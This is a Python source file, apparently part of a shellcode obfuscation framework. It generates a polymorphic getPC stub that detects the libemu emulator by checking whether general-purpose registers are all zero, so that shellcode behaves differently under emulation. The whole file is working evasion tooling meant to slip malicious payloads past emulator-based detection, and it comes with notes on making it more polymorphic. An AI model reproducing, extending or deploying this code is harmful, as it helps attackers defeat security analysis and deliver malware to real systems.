#!/usr/bin/python

"""
Libemu detection
Anti-emulation armor integrating libemu detection
"""

from struct import unpack
from random import choice, shuffle
from assembler.assembler import assembler
from evasion_modules.core.core import evasion_module
from evasion_modules.core.getpc import getpc_stub_builder
from arch.core import stackpointer_registers, arch_registers, bit_packs

class evasion_detect_libemu(evasion_module):

    #
    # getPC stub incorporating libemu detection (based on the fact that all GP registers are initialized to zero)
    #
    # [+] Features:
    #       + Lightly polymorphic (randomized register subtraction & addiction order + polymorphic getPC code)
    #
    # [-] Limitations:
    #       - This only works when executed as the very first part of the shellcode, since it relies on libemu GP register state immediately after initialization
    #
    # [*] Note:
    #       - This can be futher improved by polymorphizing both the way in which we check that all GP registers are equal and the way in which we incorporate the result in the decoder stub
    #
	def getpc_stub(self, getpc_reg):
		reg_size = 2**self.bits

		stackpointer_reg = stackpointer_registers[self.bits]

		regs = arch_registers(self.arch, self.bits)

		call_reg = regs.random_gp_reg(False, [])

		# Generate random subtraction order for GP registers
		gp_regs_s = regs.get_gp_regs(False)
		shuffle(gp_regs_s)

		reg1_s = gp_regs_s[0]
		reg2_s = gp_regs_s[1]
		reg3_s = gp_regs_s[2]
		reg4_s = gp_regs_s[3]
		reg5_s = gp_regs_s[4]
		reg6_s = gp_regs_s[5]

		# Randomly choose cumulative result GP register (cumulative result will be 0 on libemu)
		add_reg = choice(gp_regs_s)

		# Generate random addition order for GP registers (don't add cumulative result GP to itself)
		gp_regs_a = list(set(gp_regs_s) - set([add_reg]))
		shuffle(gp_regs_a)

		reg1_a = gp_regs_a[0]
		reg2_a = gp_regs_a[1]
		reg3_a = gp_regs_a[2]
		reg4_a = gp_regs_a[3]
		reg5_a = gp_regs_a[4]

		# Build stack-based getPC code, store PC in getPCDestReg
		stub_builder = getpc_stub_builder(self.arch, self.bits, self.badchars)
		getpc_instruction = unpack(bit_packs[self.bits], stub_builder.stack_getpc_stub(getpc_reg))[0]

		variables = {'stackpointer_reg': stackpointer_reg, 'call_reg': call_reg, 'add_reg': add_reg, 'getpc_instruction': getpc_instruction, 'reg1_s': reg1_s, 'reg2_s': reg2_s, 'reg3_s': reg3_s, 'reg4_s': reg4_s, 'reg5_s': reg5_s, 'reg6_s': reg6_s, 'reg1_a': reg1_a, 'reg2_a': reg2_a, 'reg3_a': reg3_a, 'reg4_a': reg4_a, 'reg5_a': reg5_a}

		listing = '''
main:
	; randomized subtraction order

	SUB {reg1_s}, {reg2_s}
	SUB {reg2_s}, {reg3_s}
	SUB {reg3_s}, {reg4_s}
	SUB {reg4_s}, {reg5_s}
	SUB {reg5_s}, {reg6_s}

	; randomized addition order

	ADD {add_reg}, {reg1_a}
	ADD {add_reg}, {reg2_a}
	ADD {add_reg}, {reg3_a}
	ADD {add_reg}, {reg4_a}
	ADD {add_reg}, {reg5_a}

	PUSH {getpc_instruction}

	TEST {add_reg}, {add_reg}
	CMOVNZ {call_reg}, {stackpointer_reg}
	CALL {call_reg}
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub